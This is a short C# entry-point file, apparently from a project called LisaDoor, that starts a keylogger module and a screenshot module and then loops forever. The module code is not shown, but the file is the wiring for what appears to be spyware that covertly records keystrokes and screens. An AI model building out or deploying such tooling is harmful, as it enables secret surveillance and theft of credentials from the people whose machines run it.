using LisaDoor.Modules;

namespace LisaDoor
{
    internal class Program
    {
        static void Main(string[] args)
        {
            KeyLogger logger = new();
            Screenshot screenshot = new();
            screenshot.Init();
            logger.Init();
            while (true) ;
        }
    }
}